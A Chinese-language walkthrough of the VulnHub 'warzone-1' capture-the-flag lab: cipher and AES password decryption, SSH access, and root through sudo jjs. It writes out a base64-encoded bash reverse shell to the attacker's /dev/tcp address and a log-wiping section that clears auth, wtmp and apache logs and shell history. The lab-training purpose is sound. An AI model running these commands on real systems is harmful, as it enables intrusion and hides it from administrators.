# 前言

靶机：`warzone-1`，IP地址`192.168.1.70`

攻击：`kali`，IP地址`192.168.1.16`

都采用虚拟机，网卡为桥接模式

# 主机发现

因为都是同一局域网下，相当于内网环境，所以使用下面的工具，若想要真实模拟外网。可以使用`nmap`等工具

使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`扫描

![](D:\stu\vulnhub\warzone靶场\pic-1\1.jpg)

# 信息收集

## 使用nmap扫描端口

![](D:\stu\vulnhub\warzone靶场\pic-1\2.jpg)

## FTP信息测试

使用`anonymous`匿名用户测试，是否开启该用户，并且未设置密码

测试发现可以登录，并且有文件，尝试下载到`kali`中

![](D:\stu\vulnhub\warzone靶场\pic-1\3.jpg)

查看文件，发现提示说，请使用这个`jar`文件加密密码，说明可能在某些时候，获取到的密码，需要通过这个文件加密后才能使用

到这里其实就已经ok了，当然也可以尝试进行反推算法，不过需要先安装`jdk`环境。

然后可以使用`jar -tf warzone-encrypt.jar`命令查看文件中的代码结构，当然这里并非详细的情况

可以使用`jd-gui`查看文件中的具体情况，然后根据代码编写对应的解密，或者在线网站解密，因为其中包含了明确的算法`AES`以及偏移量和密钥

## 网站信息探测

访问默认的界面，发现一个表，并且其中的排列有趣，按照每一列加在一起就是`itsawarzone`，像是靶机名称

不过源代码中的注释，不知道是什么含义，组合在一起并非英文词语，可能是某种加密

![](D:\stu\vulnhub\warzone靶场\pic-1\5.jpg)

对网站进行 目录爆破，发现`console`目录

![](D:\stu\vulnhub\warzone靶场\pic-1\6.jpg)

访问`console`目录，发现需要输入`PIN`值，把前面收集到的信息进行测试，发现都不对

![](D:\stu\vulnhub\warzone靶场\pic-1\7.jpg)

那还是处理一下那一串类似加密字符`GA DIE UHCEETASTTRNL`，网上搜了一下各种加密算法，最终发现栅栏密码符合这种提示，也就是通过这种表的形式，构成无规律的字符，并且其栏数，是根据其行数，也就是在加密过程是N个为一组，每一组根据其第一个字符后面接上同一行的字符，然后再接上后面的同样操作，构成的就是加密。

反过来说，其栏数，是根据其列数，根据网站显示的表格，这里也就是3

# 栅栏加密算法解密

使用网上的解密网站，发现大部分解密出的结果依然是不可读的形式，啧，这就不应该，算法应该就是栅栏加密，最终看了一下网上的`wp`，算法正确，栏数正确，就是网站问题，借助这个网站可以解密出`https://www.a.tools/Tool.php?Id=264`

![](D:\stu\vulnhub\warzone靶场\pic-1\8.jpg)

解密出`GET AUTH CREDENTIALS`，但是把其作为`pin`访问`console`，还是不对，啧

没办法，不过这里确实是有点像某些东西，获取`auth`，也就是身份和密码的信息，但是怎么获取，这是什么东西。

猜测是`get`型请求，然后访问这个目录`AUTH CREDENTIALS`，但是没有该目录

突然想到，一般网站也不会有以空格为间隙的目录或文件，去除空格，合在一起访问，还是没有。

啧，那么不去除空格呢，假设是层级目录`AUTH/CREDENTIALS`，访问还是没有

这里不清楚了，看了网上的`wp`，啧，整个都是目录，这我真没想到，我以为`get`是一种提示，使用`http`请求

注意，这里大写访问是没有效果，还是需要转换为小写再访问`get/auth/credentials`

![](D:\stu\vulnhub\warzone靶场\pic-1\9.jpg)

| username    | password                                     |
| ----------- | -------------------------------------------- |
| paratrooper | GJSFBy6jihz/GbfaeOiXwtqgHe1QutGVVFlyDXbxVRo= |
| specops     | mnKbQSV2k9UzJeTnJhoAyy4TqEryPw6ouANzIZMXF6Y= |
| specforce   | jiYMm39vW9pTr+6Z/6SafQ==                     |
| aquaman     | v9yjWjP7tKHLyt6ZCw5sxtktXIYm5ynlHmx+ZCI4OT4= |
| commander   | 2czKTfl/n519Kw5Ze7mVy4BsdzdzCbpRY8+BQxqnsYg= |
| commando    | +uj9HGdnyJvkBagdB1i26M9QzsxKHUI0EFMhhfaqt2A= |
| pathfinder  | eTQiiMXzrM4MkSItWUegd1rZ/pOIU0JyWlLNw2oW6oo= |
| ranger      | LBN5Syc7D7Bdj7utCbmBiT7pXU+bISYj33Qzf4CmIDs= |

给出用户名和密码，密码像`base64`编码，尝试发现不对，想起在`ftp`获取的`java`文件，说明这里需要进行反推算法

不过这里很奇怪，明明通过代码知道了偏移量以及密钥，但是解密出的就是不对，因为我测试先生成一个密码，对该密码进行反推，就是不对。啧，看了网上的`wp`，都是在代码中添加解密的代码

# java的AES加密

## 查看加密代码

可以先使用`jd-gui`分析代码构成，然后编写代码，这里我是直接在`encrypto`下的`main.class`编辑

![](D:\stu\vulnhub\warzone靶场\pic-1\10.jpg)

在`windows`中使用`eclipse`等工具，然后编写，根据其使用的包，进行对应的解密代码

## 通过加密代码反推解密代码

当然这里对于`eclipse`需要进行按照一些东西，才能进行反编译的操作，这里推荐一个博主的文章`(https://blog.csdn.net/qq_36880602/article/details/105714482`，详细说明如何安装插件。

然后创建一个项目地址，并创建一个包，然后创建三个主要的`java`文件，也就是`AES.java`、`Obfuscated.java`和`Main.java`

这里主要修改`Main.java`即可，就是把这个解密操作加上，调用方式与加密时都差不多的，然后运行项目即可

```java
/*Main.java*/
package de;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        boolean continueDecrypting = true;
        while (continueDecrypting) {
            System.out.println("请输入加密字符串（输入'exit'可退出）：");
            String encryptedInput = scanner.nextLine();
            if ("exit".equalsIgnoreCase(encryptedInput)) {
                continueDecrypting = false;
            } else {
                AES aes = new AES("");  // 这里密钥参数可按实际情况调整，目前示例中按原逻辑后续通过其他方式获取
                String decryptedResult = aes.decryptString(encryptedInput);
                System.out.println("解密后的结果: " + decryptedResult);
            }
        }
        scanner.close();
    }
}
```

![](D:\stu\vulnhub\warzone靶场\pic-1\11.jpg)

不过这里如果已经知道其反编译后的信息后，可以不借助该插件，当然这里在`kali`中也是可以进行相关操作的，直接创建一个目录作为包，然后在目录下创建三个`java`文件，然后直接使用`java Main.java`即可

![](D:\stu\vulnhub\warzone靶场\pic-1\12.jpg)

这是把所有的解密结果，整合起来，做成两个文件，然后使用`hydra`进行爆破

| username    | password                    |
| ----------- | --------------------------- |
| paratrooper | \#p4r4tr00per_4lw4ys_fly    |
| specops     | sp3c1alop3rations           |
| specforce   | thr33f0rces.SF              |
| aquaman     | und3rs3ay0uc4ns33           |
| commander   | il0veCalisthen1cs           |
| commando    | c0mmandosArentRea1.!        |
| pathfinder  | !c4ny0uconnect.th3d0ts      |
| ranger      | r3al_eyes_real1ze_rea1_3y3s |

# 提权

## 水平提权至captain

发现一个用户名`commando`和密码`c0mmandosArentRea1.!`

![](D:\stu\vulnhub\warzone靶场\pic-1\13.jpg)

使用`ssh`登录用户`commando`，并习惯性查看其目录的所有文件，发现`.bash_history`有内容的

![](D:\stu\vulnhub\warzone靶场\pic-1\14.jpg)

发现一个文件的地址，以及一些脚本文件

![](D:\stu\vulnhub\warzone靶场\pic-1\15.jpg)

确定为切换到`captain`目录下，然后其目录下的`Desktop`，那么查看`/home`目录，发现`captain`，进入该目录，发现`user.txt`无权访问，但是`.crypt`有访问权限的，进入该目录，发现四个文件`.c、readme.txt、encrypt.py、script.sh`

![](D:\stu\vulnhub\warzone靶场\pic-1\16.jpg)

本来尝试在`kali`中执行下面代码的，不过应该这里的某个包是其自定义的，所以，还是在靶机环境下运行

```python
from simplecrypt import encrypt, decrypt
import os
import base64
key = 'sekret'
password = 'c2MAAk1Y/hAsEsn+FasElyXvGSI0JxD+n/SCtXbHNM+1/YEU54DO0EQRDfD3wz/lrbkXEBJJJd1ylXZpi/2dopaklmG6NCAXfGKl1eWAUNU1Iw=='
decoded = base64.b64decode(password)	//这里要先base64解码
fin = decrypt(key,decoded)
print(fin)
```

运行脚本后，出现原始密码`_us3rz0ne_F1RE`，不过这个密码测试发现是`captain`的

![](D:\stu\vulnhub\warzone靶场\pic-1\17.jpg)

先去查看之前的`user.txt`

![](D:\stu\vulnhub\warzone靶场\pic-1\18.jpg)

## 垂直提权至root

访问其用户目录下的`.bash_history`后，发现有东西，这个很像是`sudo`提权

![](D:\stu\vulnhub\warzone靶场\pic-1\19.jpg)

使用`sudo -l`后，确定是，这里也是跟着步骤走，没想到直接就可以，都不用信息收集一下了

![](D:\stu\vulnhub\warzone靶场\pic-1\20.jpg)



使用网站`gtfobins.github.io`搜索用法，其实和这个历史记录是一样的

```shell
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs
```

![](D:\stu\vulnhub\warzone靶场\pic-1\21.jpg)

不过上面的代码一用就卡死，所以稍微改动一下，使其新建一个shell，并反弹出去，因为这里的`exec`是执行命令的

这里建议自己测试，或者使用**网站**`https://forum.ywhack.com/shell.php`，其生成大量的`shell`，不成功可以多试试几个

这里以`bash`进行，这里是把语句`bash -i >& /dev/tcp/192.168.1.16/9999 0>&1`进行`base64`编码，因为直接使用的时候，发现这里的符号`&`会产生一些影响，所以进行编码处理

```shell
echo "Java.type('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTYvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}').waitFor()" | sudo jjs
```

![](D:\stu\vulnhub\warzone靶场\pic-1\22.jpg)

查看`root.txt`，之前提示过，结构与`captain`相似，所以直接到`Desktop`目录可以看到

![](D:\stu\vulnhub\warzone靶场\pic-1\23.jpg)

然后还发现了加密后的密码，也可以在继续做下去，解密这个，与前面一样的

# 痕迹清理

主要就是网站目录爆破产生的日志，以及身份认证

```shell
sed -i "/192.168.1.16/d" /var/log/auth.log
echo > /var/log/btmp
echo > /var/log/wtmp
echo > /var/log/faillog
echo > /var/log/lastlog
echo > /var/log/apache2/access.log
echo > /var/log/apache2/error.log
```

然后就是历史记录，最好就是把其用户的家目录下的`.bash_history`文件中，最后操作的一些行删除

```shell
history -r 
history -c
```

最后就是创建的脚本文件，用于解密加密密码的，删除即可

# 总结

该靶场考察以下几点

1. 栅栏加密算法的识别，以及是否能够解密
2. 栅栏加密解密出的内容，自己能否一一测试，这里就是最终测试为网站目录
3. 对于`java`代码是否了解一些，以及`AES`算法所需要的东西，这些都需要去了解，`java`代码一定要能够看懂，最好就是能够自己编写解密的代码。当然这里也可以使用`ai`进行辅助，毕竟有那个条件
4. 对于隐藏文件是否能够找出，也就是常用命令`ls -al`
5. 对于`python`代码有简单的了解，至少要知道这个代码做了什么，然后才好进行逆向操作
6. 对于提权`sudo`的一些用法
7. 一些反弹`shell`的使用，这个真的很多



































